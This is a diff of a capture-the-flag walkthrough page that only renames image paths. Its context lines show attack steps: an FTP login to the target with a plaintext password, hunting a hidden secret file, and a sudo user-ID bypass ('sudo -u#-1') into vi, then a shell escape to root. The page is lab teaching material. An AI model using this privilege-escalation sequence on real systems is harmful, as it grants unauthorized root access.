@@ -60,7 +60,7 @@ Select the javascript.enabled toggle to change the value to false.
 
 
 
-<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (79) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -91,7 +91,7 @@ ftp $VICTIM
 password: 5iez1wGXKfPKQ
 ```
 
-<figure><img src="../../.gitbook/assets/image (7) (4) (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (4).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
@@ -117,7 +117,7 @@ locate s3cr3t
 cat cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
 ```
 
-<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (64) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (14) (1) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -144,7 +144,7 @@ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
 :!/bin/sh
 ```
 
-<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (75) (2).png" alt=""><figcaption></figcaption></figure>
 
 
 
